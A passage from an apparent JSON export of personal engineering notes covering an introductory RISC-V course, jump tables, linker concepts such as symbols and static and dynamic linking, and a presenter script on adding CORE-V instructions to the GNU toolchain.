Industry Alliances, and the quickly-growing RISC-V user community.\n\n#### Operations \u0026 Program Management\nOperations include the day-to-day management of member activities - joining RISC-V, onboarding, paying dues, becoming part of the Member Portal, and other member activities - as well as support for all other business functions within RISC-V International.\n\n### RISC-V Wiki\nThe wiki can be found [here](https://wiki.riscv.org/).\n\n### Public Discussion Groups\nCan join discussions and others using links from the [technical page](https://riscv.org/technical/technical-forums/) on the website.\n\n### The RISC-V Exchange\nThe Exchange contains:\n\n- _Available Boards_ - RISC-V based single board computers (SBCs) both open source hardware and proprietary designs. These range from simple microcontroller boards to complex System on Chip (SoC) designs.\n- _Available Cores \u0026 SoCs_ - These hardware designs might be open source or proprietary, and may be available for free or for purchase.\n- _Available Software_ - Software is available in binary form and in source code form. Licenses stretch across the spectrum from permissive open source to restrictive proprietary licenses.\n- _Available Services_ - Many organisations provide services relevant to RISC-V product development, including design, verification, software tooling, and more.\n- _Available Learning_ - Books, online courses, curricula and academic materials, and anything else related to learning about RISC-V.\n\n## Chapter 4 - Developing RISC-V\n### Overview\n- Describe the process used to develop the RISC-V ISA and extensions.\n- Differentiate between the RISC-V Base ISAs, Extensions, and Standards.\n- Understand the basics of the Unprivileged and Privileged specifications.\n\n### How the RISC-V ISA is Different\nThe most notable difference between RISC-V and other [ISAs](notes/private/work/isa.md) is that RISC-V is developed by a member organisation that is completely free to join and licenses its ISA with permissive open source licenses. This means that anyone can contribute to the specifications, and no one company or group of companies can drive the direction of the standards.\n\nRISC-V International is governed by its Board of Directors. The Board is composed of members elected to represent all classes of membership to ensure we offer a strategic voice at all levels. In addition, the Technical Steering Committee (TSC) provides leadership to our technical initiatives in setting long term strategy, forming tactical committees and work groups, and approving technical deliverables for ratification or release.\n\n### Collaborative Development Model\nA RISC-V Specification starts its life as a **Task Group** approved by the Technical Steering Committee (TSC). Once a Task Group has an approved charter, they begin work publicly on GitHub by writing their documents in **AsciiDoc format**. These repositories on GitHub can only receive pull requests from RISC-V International members, however the work is done publicly and transparently. \n\nFor groups who choose to take minutes, those minutes from the Task Group meetings are published publicly as well. The public is free to submit issues to the GitHub repository in order to give early feedback on any specification. Non-ISA specifications and standards (e.g. processor trace, architectural tests, software overlay) are developed in a similar fashion.\n\nRISC-V Specifications live on GitHub and are housed alongside dozens of software projects. See [a list of ratified specifications](https://riscv.org/technical/specifications/) and the links to their GitHub repositories.\n\n### Creating and Curating Open Specifications\nThe process of writing the specifications is usually led by a Hardware Architect at one of the RISC-V International member organisations. They may not write the actual text, but they act as the chair to the Task Group overseeing the specification’s development. It can take anywhere from several months to more than a year for the group to complete a specification. We will talk about the lifecycle of an extension later in this chapter.\n\nWhat makes this development process open hinges on three key facts:\n\n1.  The Task Group mailing list is publicly visible.\n2.  The specification document is publicly visible and comments can be left.\n3.  There is a public mailing list where anyone can send email. (isa-dev@groups.riscv.org)\n\nUsing this methodology, even non-members can participate in the development of any specification or standard by asking questions, making suggestions, or simply following along. Furthermore, during the ratification process, there is a 45 day window where all specification work must be frozen and the specification published publicly for review. Anyone is welcome to comment at this time and all issues will be brought to resolution before the vote for ratification happens.\n\nWhile becoming a member of RISC-V International is the easiest way to contribute to open specifications, it is not the only way. Anyway can contribute by interacting with the Task Groups in public forums like the [mailing list](https://riscv.org/mailing-lists/) and GitHub.\n\n### RISC-V Extensions Lifecycle\nEach RISC-V extension goes through several stages on its way to ratification. In this section we will briefly review each stage known as a “milestone”.\n\n1. _Inception_ - RISC-V technical leaders approve pursuing the extension.\n2. _Kickoff_ - Leadership approves an “acting chair” to drive the process in a task group. The chair creates a name for a task group, preliminary charter, and deliverables.\n3. _Plan_ - The group develops a final charter and sets some timeline estimates.\n4. _Experimental Versions_ - The groups releases several versions considered unstable.\n5. _Freeze_ - The group produces a complete final draft of the specification with no major unknowns and no expected changes (only to fix issues but no new features).\n6. _Ratification Ready_ - The draft specification is sent out for public review, any public comments or questions are addressed, and the Technical Steering Committee is made aware that a vote is required.\n7._Complete_ - The extension is ratified and supported as part of the RISC-V ISA.\n\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/e9ec87214f09abf0169226df15e0388d/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/Extension_lifecycle_and_milestone_definitions.jpg\"\u003e\u003c/center\u003e\n\nOnce an extension has been ratified it is added to either the **Unprivileged** or **Privileged** Specification. Occasionally a specification is created as part of a separate document, with the debug specification being the most common example. However, this is a rare case and usually indicates that the extension is not part of the [ISA](notes/private/work/isa.md), but rather a “standard” or “non-ISA specification”. We will now review the Unprivileged and Privileged Specification in greater detail.\n\n### Organising the Specifications\nThe RISC-V [ISA](notes/private/work/isa.md) is broken up into two parts:\n\n-   Volume 1, Unprivileged Specification\n-   Volume 2, Privileged Specification\n\nTo understand why the specification is broken up into two different parts, we must first understand a bit about computer architecture and security. Historically, processors used hierarchical protection domains, often called protection rings, to protect data and code from malicious actors.\n\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/a747ba9c1697a0bea78672847048eed5/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/Privilege_rings_for_the_x86__along_with_their_common_uses.png\"\u003e\u003c/center\u003e\nThe most privileged code runs in “Ring 0” and has access to the entire system. The processor will decide which privileges to grant executing code based on the privilege level. As an example, accessing memory by physical address may be restricted to “Ring 0” such that other rings must reference the virtual address space. Typically the processor can run in only one of the privilege modes at a time and there are special instructions to move between modes. All of these details can change from system to system, however they must follow the rules set out in the specification documents of a given architecture.\n\nRISC-V currently has three privilege levels: **User Mode** (U-mode), **Supervisor Mode** (S-mode), and **Machine Mode** (M-mode). One can think of these as “Ring 2”, “Ring 1”, and “Ring 0” respectively. Other modes like a hypervisor mode (H-mode) will likely be added in the near future. Much like in the figure above, U-mode is for user processes, S-mode is for kernel and/or device drivers, and M-mode is used for bootloader and/or firmware. Each privilege level has access to specific _Control and Status Registers_ (CSRs), and higher privilege levels can access the CSRs of those less privileged levels.\n\n### Inside the Unprivileged Specification\nSimply put, the unprivileged specification details items that are not related to machine mode (M-mode) or to Supervisor Mode (S-mode). The unprivileged specification includes the base ISA as well as extensions to that base like integer (I), float (F), double (D), compressed instructions (C), and many more.\n\nThe base instruction sets describe the instruction format, basic integer instructions, load and store instructions, and other fundamental details of the ISA. We break these up into several bases:\n\n1.  RV32I - Integer 32 bit\n2.  RV32E - Reduced RV32I for embedded purposes\n3.  RV64I - Integer 64 bit\n4.  RV128I - Integer 128 bit\n\nAll these “Base ISA’s” either reduce or extend off the RV32I base instruction set. As an example, RV64I widens the integer registers and the supported user address space to 64 bits. This means that the LOAD and STORE instructions work a bit differently than in RV32I and the unprivileged specification contains the chapter explaining these differences.\n\n### Base ISA Extensions\nThe unprivileged specification also contains the descriptions of the extensions to these base ISAs. Again, any extension that does note require M-mode to operate can be described in the unprivileged specification.\n\nEach extension to the base ISA is developed and maintained by a Task Group:\n\n-   _Crypto Task Group_ working on cryptographic extensions which can move many complex cryptographic algorithms into hardware, improving reliability and speed.\n-   _B Extension Task Group_ working on bit manipulation extensions which can speed up many common mathematical tasks.\n-   _Vector (V) Extension Task Group_ working on vector instructions which are at the heart of many graphical processing computations.\n\nOnce ratified, these extensions are added to the unprivileged specification. The following are some of the ratified extensions that you might see in a RISC-V processor:\n\n#### “M” Standard Extension\nChapter 7 of the [Unprivileged Specification](https://riscv.org/technical/specifications/) describes how integer multiplication and division should be accomplished. It describes how each of the multiplication instructions (MUL, MULH, MULHU, MULHU, MULW) will behave, which registers are used for the multiplier and multiplicand, and where the result will be stored. It does the same for division since functionally one can view division as simply the inverse of multiplication. It may seem odd to you that this extension is not required. However, for many embedded processors, multiplication can be done in software if it is not required very often or even at all. Removing this logic from a processor will save money on development, keeping the end product cost lower.\n\n#### **“F” Standard Extension**\nChapter 11 describes how we add single-precision floating-point computational instructions that are compliant with the IEEE 754-2008 arithmetic standard. There are many resources available covering the details of floating-point arithmetic in computing. It is enough to understand that this chapter describes how this process is implemented in RISC-V, and is complimented by Chapter 12 (the D extension) which describes double-precision floating-point computational instructions. Lastly, Chapter 13 covers the Q standard extension for 128-bit quad-precision binary floating-point instructions. All three of these conform to IEEE standards. Again, many embedded applications do not require floating point logic, and hence this extension is not part of the Base ISAs.\n\n#### **“C” Standard Extension**\nChapter 16 describes the compressed instruction-set extension which reduces static and dynamic code size by adding short 16-bit instruction encodings for common operations. Typically, 50%–60% of the RISC-V instructions in a program can be replaced with RVC instructions, resulting in a 25%–30% code-size reduction. The C extension is compatible with all other standard instruction extensions. The C extension allows 16-bit instructions to be freely intermixed with 32-bit instructions, with the latter able to start on any 16-bit boundary. As such, with the addition of the C extension to any system, no instructions can raise instruction-address-misaligned exceptions.\n\nThis covers most of the currently ratified extensions in the unprivileged specification. However, it is important to note that many extensions are included in the specification in a “draft” or “frozen” stage. As we discussed in the section on “[](notes/private/work/introduction-to-riscv.md#RISC-V%20Extensions%20Lifecycle|RISC-V%20Extension%20Lifecycle)”, these specifications are not yet ratified and any implementation should avoid using them in production.\n\n### The Privileged Specification\nAs its name suggests, the privileged specification contains descriptions of the RISC-V [ISA](notes/private/work/isa.md) which operate in Machine Mode (M-mode) or Supervisor Mode (S-mode). These modes have elevated privileges and are therefore described in a completely separate document from the base [ISA](notes/private/work/isa.md) and standard extensions. This specification also contains additional functionality required for running rich operating systems like Linux.\n\nThe first part of each chapter of the privileged specification details the Control and Status Registers (CSRs) which are only accessible from M-mode and S-mode. We will not cover these details here, but will rather focus on other details specific to these two modes.\n\n### Machine-Level (M-Mode) ISA\nM-mode is used for low-level access to a hardware platform and is the first mode entered at reset, when the processor finishes initialising and is ready to execute code.\n\nM-mode can also be used to implement features that are too difficult or expensive to implement in hardware directly. A good example of this would be a watchdog timer implemented in low level software (firmware) which helps the system recover from faults.\n\n### Non-Maskable Interrupts (NMIs)\nNon-maskable interrupts (NMIs) are only used for hardware error conditions. When fired, they cause an immediate jump to an NMI handler running in M-mode, regardless of how that hardware thread has its interrupt enable bit set. In other words, that interrupt will be serviced without a way to block the service in configuration. \n\nEach NMI will have a “mcause” register associated with it. This allows implementations to decide how they wish to handle these interrupts and allows them to define many possible causes. NMIs do not reset processor state which enables diagnosis, reporting, and possible containment of the hardware error.\n\n### Physical Memory Attributes (PMA)\nThe physical memory map for a system includes address ranges like: memory regions, memory-mapped control registers, and empty holes in the address space. Some memory regions might not support reads, writes, or execution; some might not support subword or subblock accesses; some might not support atomic operations; and some might not support cache coherence or might have different memory models. In RISC-V systems, these properties and capabilities of each region of the machine’s physical address space are termed physical memory attributes (PMAs).\n\nThe PMAs of some memory regions are fixed at chip design time—for example, for an on-chip ROM. Others are fixed at board design time, depending, for example, on which other chips are connected to off-chip buses. Some devices might be configurable at run time to support different uses that imply different PMAs—for example, an on-chip scratchpad RAM might be cached privately by one core in one end-application, or accessed as a shared non-cached memory in another end-application. Most systems will require that at least some PMAs are dynamically checked in hardware later in the execution pipeline after the physical address is known, as some operations will not be supported at all physical memory addresses, and some operations require knowing the current setting of a configurable PMA attribute.\n\nFor RISC-V, we separate out specification and checking of PMAs into a separate hardware structure, the “PMA checker”. In many cases, the attributes are known at system design time for each physical address region, and can be hardwired into the PMA checker. Where the attributes are run-time configurable, platform-specific memory-mapped control registers can be provided to specify these attributes at a granularity appropriate to each region on the platform (e.g., for an on-chip static random-access memory (SRAM) that can be flexibly divided between cacheable and uncacheable uses).\n\nThe details of PMAs could easily take up an entire chapter of this course. We will not cover memory-ordering PMAs, idempotency PMAs, coherence PMAs, or cacheability PMAs. The details of PMAs are described in detail in section 3.5 of the [Privileged Specification](https://riscv.org/technical/specifications/). Advanced users may want to review this section.\n\n### Physical Memory Protection (PMP)\nA common feature of most modern processors is some way of performing secure remote computation or a “trusted execution environment”. Examples of this technology include Intel Software Guard Extensions (SGX), AMD Secure Encrypted Virtualization (SEV), and Arm TrustZone. While the RISC-V ISA does not provide an end-to-end solution for Trusted Execution Environments, the physical memory protection (PMP) capabilities are a solid foundation on which one might construct such a system.\n\nRISC-V PMP limits the physical addresses accessible by software running on a hart (hardware thread). An optional PMP unit provides per-hart machine-mode control registers to allow physical memory access privileges (read, write, execute) to be specified for each physical memory region. The PMP values are checked in parallel with the PMA checks we covered in the last section. The granularity of PMP access control settings are platform-specific and within a platform may vary by physical memory region, but the standard PMP encoding supports regions as small as four bytes. Certain regions’ privileges can be hardwired—for example, some regions might only ever be visible in machine mode but in no lower-privilege layers.\n\nPMP entries are described by an 8-bit configuration register and one 32 (or 64) bit address register. Up to 16 PMP entries are supported. If any PMP entries are implemented, then all PMP CSRs must be implemented, but any PMP CSR fields may be hardwired to zero. PMP CSRs are only accessible to M-mode.\n\n\u003ccenter\u003e\u003cimg src=\"https://courses.edx.org/notes/images/courseware/v1/2bc57c54106ee5b9e0462510442bf21c/asset-v1:LinuxFoundationX+LFD110x+1T2021+type@asset+block/Example_illustrating_how_to_set_up_two_different_contexts__one_untrusted_and_one_with_access_to_Enclave_E1.png\"\u003e\u003c/center\u003e\nSource: By Lee, D., Kohlbrenner, D., Shinde, S., Song, D., \u0026 Asanovic, K.

Keystone: A Framework for Architecting TEEs. _CoRR, vol. abs/1907.10119_ [http://arxiv.org/abs/1907.10119](https://arxiv.org/abs/1907.10119).\n\nHere we see an example of how one might set up two different contexts, one untrusted and one with access to “Enclave E1”. In this example an application is run in user context U1. That application only has access to its own memory and the memory inside enclave E1. The memory inside enclave E2 and that located in the “security monitor” (SM) are not available to the user application. In this way, data confidentiality is assured simply by allowing the security monitor (running in M-mode) to change the PMP settings allowing or denying access to memory regions based on the PMP configurations.\n\n### Supervisor-Level (S-Mode) ISA\nThis chapter describes the RISC-V supervisor-level architecture, which contains a common core that is used with various supervisor-level address translation and protection schemes. Supervisor mode is deliberately restricted in terms of interactions with underlying physical hardware, such as physical memory and device interrupts, to support clean virtualisation. In this spirit, certain supervisor-level facilities, including requests for timer and interprocessor interrupts, are provided by implementation-specific mechanisms. In some systems, a supervisor execution environment (SEE) provides these facilities in a manner specified by a supervisor binary interface (SBI). Other systems supply these facilities directly, through some other implementation-defined mechanism.\n\nRISC-V supports Page-Based 32-bit, 39-bit, and 48-bit virtual memory addressing. The supervisor (S-Mode) memory-management fence instruction (SFENCE.VMA) is used to synchronise updates to in-memory memory-management data structures with current execution. Executing this instruction guarantees that any previous stores already visible to the current RISC-V hart (hardware thread) are ordered before all subsequent implicit references from that hart to the memory-management data structures.\n\nVirtual Memory is a concept which takes several months of graduate level education to grasp and is beyond the scope of this course. It is enough for this course that you understand that RISC-V supports Page-Based virtual memory of several widths, and that there is a special S-Mode instruction used for synchronising updates between hardware threads.\n\n### Non-ISA Specifications\nTask Groups can also work on software or standards that are not part of the [ISA](notes/private/work/isa.md). For example, the following groups work on projects that do not lead to specifications being written, but rather standards that encourage communities to develop their products around a common framework:\n\n-   _Debug Task Group_ working on external debugging support and standards.\n-   _Compliance Task Group_ working on RISC-V ISA compliance tests and frameworks.\n-   _Configuration Structure Task Group_ working on how to represent the configuration structure of a given hardware implementation both in a human-readable format, as well as a binary format.\n\n## Chapter 5 - RISC-V In Practice\n### Overview\n-   Understand how to emulate a simple Linux system using QEMU.\n-   Write a simple “Hello World” program in RISC-V 64 bit assembly language.\n-   Compile and run a RISC-V application in emulation.\n\n### Required Documentation\nFirst off, Chapter 2 of the RISC-V [](notes/private/work/introduction-to-riscv.md#Inside%20the%20Unprivileged%20Specification|Unprivileged%20Specification) goes into detail about the RV32I Base Integer Instruction Set, including a programming model and an explanation of instruction formats. While this information is not required for this course it is certainly helpful in understanding how the RISC-V architecture executes instructions.\n\nFor programming assembly instructions, we can use both the ABI reference documentation and the ASM manual to answer any questions we may have along the way. You can find those documents here:\n\n-   [RISC-V Specifications](https://riscv.org/technical/specifications/)\n-   [ABI Documentation](https://github.com/riscv/riscv-elf-psabi-doc/blob/master/riscv-elf.md)\n-   [ASM Manual](https://github.com/riscv/riscv-asm-manual/blob/master/riscv-asm.md)\n\nAgain, none of this information is required knowledge for this chapter, but you can reference it if you have any questions not answered here.\n\n### Assembly Language Overview\nThis chapter will be a very high level overview of RISC-V assembly instructions and will only cover a few of those instructions in practice. The hope is that this tutorial will give you the tools you need to continue your journey programming assembly language. If your goal is simply to understand the basics and develop applications in a higher level language, this course will likely cover most of the information you need.\n\nRISC-V is a “reduced instruction set” architecture, and as such, there are not many instructions to learn. In this tutorial, we only use 3 instructions: `LA` (load absolute address), `ADDI` (add immediate), and `ECALL`. The `ECALL` instruction is used to make a service request to the execution environment. We will only use two calls in our Hello World app, one to “write” and one to “exit”.\n\nFor a full list of instructions you can see the [](https://riscv.org/wp-content/uploads/2019/12/riscv-spec-20191213.pdf#129).  For more information, visit [RISC-V website](https://riscv.org/community/learn/).\n\n### Compiling Required Binaries\nInstructions for compiling required binaries can be found in the _[\"RISC-V - Getting Started Guide\"](https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html)_.\n\n### Creating a Custom RISC-V System\nIf you are already comfortable with compiling the Linux kernel, QEMU, and software suites like BusyBox, you may want to take things a step further. There is a build system for creating Linux based root file systems and emulating them called the Yocto Project. RISC-V has a “layer” which can be used to create a completely custom Linux distribution. For more details see [meta-riscv](https://github.com/riscv/meta-riscv) on GitHub.\n\n### Environment Overview\nThe hello world application we will be using:\n\n```assembly\n# Simple RISC-V Hello World\n\n.global _start\n\n_start: addi x0, x0, 1\n        la   a1, helloworld\n        addi a2, x0, 13\n        addi a7, x0, 64\n        ecall\n\n        addi a0, x0, 0\n        addi a7, x0, 93\n        ecall\n\n.data\nhelloworld:    .ascii \"Hello World!\\n\"\n```\n\nThere are also two ways of compiling this code, either using GCC or calling “as” and “ld” directly:\n\n```bash\n# GCC  \nriscv64-linux-gnu-gcc -o rv-hello rv-hello.s -nostdlib -static\n```\n```bash\n# AS \u0026 LD  \nriscv64-linux-gnu-as -march=rv64imac -o rv-hello.o rv-hello.s  \nriscv64-linux-gnu-ld -o rv-hello rv-hello.o\n```\n\n---\n## More information\n- [riscv.org](https://riscv.org/)\n- [Benefits of open instructions.](https://www2.eecs.berkeley.edu/Pubs/TechRpts/2014/EECS-2014-146.pdf)\n- [RISC-V Genealogy](https://riscv.org/technical/specifications/risc-v-genealogy/)","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work/engineer-training"]},"/notes/private/work/isa":{"title":"ISA (Instruction Set Architecture)","content":"An instruction set architecture (ISA) is an abstract model of a computer.

This means retrieving the pointer and calling a function or jumping to the machine code depending on the type of table used.\n\nThe benefits are:\n- Indexes are more memory efficient than MC or pointers.\n- The index will remain stable and changing the function is as simple as swapping out the function pointer.\n\nIt is kind of like a **switch** statement:\n\n```c\nJT(int c)\n{\n   switch(state)\n   {\n      case 0:\n         goto func0label;\n      case 1:\n         goto func1label;\n      case 2:\n         goto func2label;\n   }\n}\n```","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["work","cs/relocations","cs/linker"]},"/notes/private/work/linker":{"title":"Linker","content":"Official documentation: https://sourceware.org/binutils/docs/ld/\n\nThe linker combines a number of object and archive files, relocates their data and ties up symbol references.\n\nWhen one object file references functions or variables, which do not exist within the file's context but exist in other object files (dependencies) then they must be linked. \n\nLinking allow the use of separate, independent sources of code by providing a way to merge the code together in a single file, meaning the developer is spared of the low-level detail.\n\nFor example:\n\n```c\n#include \u003cstdio.h\u003e\n\nvoid main() {\n    printf(\"Hello mum!\");\n}\n```\n\nHere we don't implement the `printf` function, we link our file, `file.o`, against `printf.o` which is imported from `stdio.h`. It is important to notice that we import the definition of `printf` not the implementation.\n\n```toc\n```\n\n## Linker Script\nEvery link is controller by a **linker script** which can be seen by running:\n\n```bash\nriscv32-unkown-elf-ld --verbose\n```\n\nEach section in an object file has a name and size. Most sections also have an associated block of data, known as the **section contents**.\n\nA section may be marked as **loadable** or **allocatable** (meaning memory needs to be set aside, but nothing to load).\n\nEvery loadable or allocatable output section has two addresses: the **VMA** (virtual memory address) and the **LMA** (load memory address).\n\n- VMA: address the section will have when the output file is run.\n- LMA: address at which the section will be loaded.\n\nIn most cases both are the same.\n\nTo see the sections of a program:\n\n```bash\nriscv32-unknown-elf-objdump -h \u003cfile\u003e\n```\n\nTo see the symbols:\n\n```bash\nnm # OR\nriscv32-unknown-elf-objdump -t \u003cfile\u003e\n```\n\n## Symbols\nWhen a symbol is declared, two things happen:\n\n1. The compiler reserves enough space in the program's memory to hold the **value** of the symbol.\n2. The compiler creates an entry in the program's symbol table which holds the symbol's **address** (block of memory holding the symbol's value).\n\nFor example if we have:\n\n```c\nint foo = 1000;\n```\n\nIt creates an entry called `foo` in the symbol table, which holds the address of an `int` sized block of memory where the number 1000 is initially stored.\n\nSymbolic references get translated into offsets and addresses during compilation. However, this doesn't only happen during machine code generation, it can also be exported from **source code**. This is done to improve the interpretation of the generated machine code.\n\nThe linker interacts with a symbol table to reference/modify/match a given symbol inside and ELF object at linktime.\n\nIn ELF, each symbol is represented as an instance of an `Elfxx_Sym` structure inside a given [**symbol table**](notes/private/work/plt-and-got.md). (To retrieve them we use bitmasks).\n\nAn ELF object may contain a maximum of two **symbol tables**: `.symtab` and `.dynsym`. `.symtab` is the binary's global symbol table. The `.dynsym` holds symbols needed for **dynamic linking** (external objects, shared objects).\n\n![Pasted image 20220802095635](notes/images/Pasted%20image%2020220802095635.png)\n\nHere you can see the binary contains the symbol `_IO_stdin_used`, which is the second `Elf32_Sym` instance in `.dynsym`. The `.dynsym` section is represented as an `Elf32_Shdr` structure, and the index of its **string table** within the **section header** table can be retrieved by its `Elf32_Shdr` link field.\n\nMoreover, the symbol resides within the `.rodata` section as shown by its `Elf32_Sym` `st_shndx` field, fourth instance within `Elf32_Shdr`.\n\nTherefore, we can obtain `_IO_stdin_used` attributes based on its `Elf32_Sym` instance.\n\n`st_value` -\u003e contains a virtual address denoting the symbol's location within its correspondent section, but not the actual value of the symbol.\n\n- **Local variables** go in the stack.\n- **Dynamically allocated memory** is taken from the **heap**, and then the **malloc** function keeps track of where all the available space is this area is.\n\nTherefore, the stack grows towards the heap so we only run out of memory if they meet in the middle.\n\n### Duplicate Symbols\nIn C++, we have a constraint known as the **one definition rule** which says that there has to be exactly one definition for a symbol when it comes to link time.\n\nIn C, there has to be exactly one definition of any functions or initialised global variables, but the definition of an uninitialised global variable can be treated as a **tentative definition**. C then allows different source files to have tentative definitions of the same object.\n\nIt is common for UNIX linkers to **not** complain about duplicate definitions of symbols are they have to cope with other programming languages than just C and C++.\n\n### Referencing Symbols\nWhen a program references a symbol, the compiler generates code to first access the symbol table to find the address of that symbol's memory block and then code to read the value from that memory block, so:\n\n```c\nfoo = 1;\n```\n\nLooks up the symbol `foo` in the symbol table, gets the address associated with the symbol and then writes the value 1 into that address. Whereas:\n\n```c\nint * a = \u0026 foo;\n```\n\nLooks up the symbol `foo` in the symbol table, gets it address and then copies this address into the block of memory associated with the variable `a`.\n\n**Linker scripts** symbol declarations create an entry in the symbol table but do not assign any memory to them. Thus they are an address without a value, for example:\n\n```c\nfoo = 1000;\n```\n\nCreates an entry in the symbol table called `foo` which holds the address of memory location 1000, but nothing is stored there. This means that you cannot access the **value** of a linker script defined symbol, all you can do is access the **address**.\n\nHence we should always take the address of the symbol, and never attempt to use its value.\n\n## Static Linking\n![Pasted image 20220802105128](notes/images/Pasted%20image%2020220802105128.png)\n\n**Ld** collects all relevant object files, applies [relocations](notes/general/relocations.md) and combines the file into a single binary.\n\n### Static Libraries\nThe command to produce them is normally `ar`, and the library file has a `.a` extension. These files are normally also prefixed with `lib` and passed to the linker with a `-l` option followed by the name of the library (so `-lfred` will pick up `libfred.a`).\n\nLibraries are consulted **only** when the normal linking is done and they are processed in order, left to right. This means that if an object pulled in from a library late in the link line needs a symbol from a library earlier in the link time, the linker won't automatically find it.\n\n## Dynamic Linking\nIt requires **shared** libraries to create a dynamically linked executable. The output file will contain the executable's code and the names of the shared libraries required, embedded within the binary:\n\n![Pasted image 20220802105245](notes/images/Pasted%20image%2020220802105245.png)\n\nSo when the binary is executed, we find the required dependencies to load and link together. Therefore, we defer the linking stage from compile-time to run-time.\n\nMore details here: https://www.intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/\n\n### Shared Libraries\nA disadvantage of **static** linking is that the code in the program is fixed forever, if someone finds a bung in `printf`, then every program has to be linked again in order to pick up the fixed code.\n\nIf the linker finds that the definition for a particular symbol is in a shared library, then it doesn't include the definition of that symbol in the final executable. Instead, it records the name of the symbol and which library it is supposed to come from in the executable file instead.\n\nBefore the `main` function is run, a smaller version of the linker (`ld.so`) goes through the \"promissory notes\" and does the last stage of the link there and then.\n\nIf a particular symbol is pulled in from a particular shared library (`printf` in `libc.so` for example), then the whole of that shared library is mapped into the address space of that program. This is very different from the behaviour of a static library, where only the particular objects that held undefined symbols got pulled in.\n\n## Related Notes\n- [Relocations](notes/general/relocations.md)\n- [PLT and GOT](notes/private/work/plt-and-got.md)\n- [Howto Table](notes/general/howto-table.md)\n- [Linker Relaxation](notes/general/linker-relaxation.md)\n- [Jump Table](notes/private/work/jump-table.md)","lastmodified":"2023-09-12T17:33:55.169934463Z","tags":["cs/linker","help"]},"/notes/private/work/meetup-2020-corev-script":{"title":"Meet-up 2020 CORE-V - Script","content":"Slides can be found [here](assets/meetup-2020-corev-presentation-v11.odp).\n\nGood evening, I’m Pietra and today together with my colleagues Mary and Jessica we will be presenting our work on porting the GNU CORE-V toolchain.\n\n(next slide)\n\nHere we see all the components which make up a modern GNU tool chain. For standard RISC-V we can already compile Ada, C and C++ and in the future Fortran and OpenMP. We have the compiler GCC, the GNU assembler, gas, the GNU Debugger, GDB and a set of binary utilities. We have low-level libraries to support C and C++ on any RISC-V variant and a range of standard C libraries for systems both large and small. We have the option to use a hand-written assembler, or to use CGEN to generate the assembler, disassembler and simulator from a semi-formal description.\n\n(next slide)\n\nLet us look at supporting the CORE-V variants of RISC-V. These are all standard RISC-V cores, so can use the standard assembler and compiler. However CORE-V has a number of instruction set extensions, which we wish to support as well. Our initial focus is to extend the compiler and assembler (highlighted in red) to support them. For now we finished implementing our first instruction in both Binutils and GCC. In the future, we hope to extend CGEN to give us automatic generation, together with a simulator.\n\n(next slide)\n\nHere you can see how we approached the implementation. We first provide support in the assembler and linker, followed by GCC builtin function support, and finally GCC optimization patterns to use these instructions automatically. These three steps are the structure that will be used to implemented each instruction, starting with hardware loop. Code optimisation for now is out of scope of this project.\n\n(next slide)\n\nThis project has been running since the middle of August. We plan to support the five group of intructions shown here. To make it clear that the tool chain is targeting CORE-V, we use the vendor field of the target triplet. Thus we shall have riscv32-corev-elf instead of riscv32-unknown-elf. We provide additional architecture specifications to specify either the whole CORE-V support (Xcorev), or just selected parts - for example for hardware loops it is (Xcorevhwlp). Finally all CORE-V instructions will be prefixed by “cv.”.\n\nThe first commit to upgrade the assembler to support hardware loops was made and is downloadable as source from the Open Hardware Group GitHub repositories and as a pre-packaged binary from Embecosm.\n\n(next slide)\n\nNow we will be explaining how was our process of adding an instruction. It is important to note that while the examples and files shown are RISC-V specific, the information is transferable to other architecture ports.\n\nWe will be using cv.starti as an example throughout the presentation. Cv.starti is part of the CORE-V hardware loops extension and declares the address of the offset to the start of the loop as well as the loop number, which can be 0 or 1 depending if it is an inner or an outer loop. It is important to note that hardware loop provides a total of six instructions, cv.starti being one of them. Here you can see its generic pattern:\n\n(next slide)\n\nLet’s move on to the first part of the implementation: binutils.\n\n(next slide)\n\nSo in order to follow this implementation, some changes will need to be made: we need to modify the opcodes library (both encoding and decoding), modify the assembler to use the new table entries and extend our linker relocations. Here you can see all the main files changed.\n\n(next slide)\n\nLet’s implement a new instruction. First we add the instruction to the RISC-V opcodes structure, which contains all the instructions available for the RISC-V architecture. Note that the structure is generic, but the specifics of it are RISC-V. In other words, other architectures will have similar tables but the details vary from architecture to architecture. Let’s break it down:\n\n(next slide)\n\nWe have the name of the instruction, cv.starti.\n\n(next slide)\n\nXlen which indicates instruction length requirements (either 32 or 64 or 0), 0 for both.\n\n(next slide)\n\nThe instruction class which is defined in the RISC-V header file inside an enum set. In this example we had to add an specialised class for the HW loop extension. This might not be necessary if you’re new instruction already fits an existing class.\n\n(next slide)\n\nThe instruction operands which in this example are di and b1, di mapping to the loop number while b1 maps to the immediate. They are given in the order they appear in the symbolic assembler and not the encoded instruction, as you can see.\n\n(next slide)\n\nWe then have our MATCH and MASK defined in the RISC-V opcodes header file. Instruction masks are used to hard code common encoding fields in the instruction, such as the opcode, and to mask preset bits with 1 in the operand encoding fields. You can see that how it is calculated here. So if you exclusive OR something with the MATCH, and all bits are the same as MASK, then the return will be 0.\n\n(next slide)\n\nHere you can see a table that shows how the mask works for our cv.starti example. It hard codes the source register, function, the destination register and the opcode. We then have our match field checking the encoding.\n\n(next slide)\n\nWe then have the match function, which determines if a word corresponds to this instruction. Match_opcodes will give you a simple pattern match, meaning that it doesn’t require any additional assistance from the fuction.\n\n(next slide)\n\nThe match function does the encoding \u0026 mask = match calculation that I previously mentioned, but in a different manner as you can see. Meaning that in the actual code base, a different boolean formula is used but it is equivilant.\n\n(next slide)\n\nAnd lastly we have Pinfo, a collection of bits describing the instruction, notably any relevant hazard information. For example, it can be used to indicate it is an alias, a macro or even a branch instructions. Mary will now give details on disassembly and assembly.\n\n(M-next slide) (opcodes/riscv-dis.c)\n\nThe other file that must be edited in the opcodes directory is riscv-dis.c. In this file there is a function called print_insn_args which disassembles a bit stream. All operands must be added to this function. We can use this to ensure that our instructions are being printed out correctly during assembly. As described later, this is essential for testing.\n\nThe example on this slide is the branch offset operand, b1. I would like to draw your attention to the EXTRACT macro, which must be defined in the include/opcode directory in the riscv header file. This macro extracts only the bits used for the b1 operand from the bit stream. The other operations are specific for 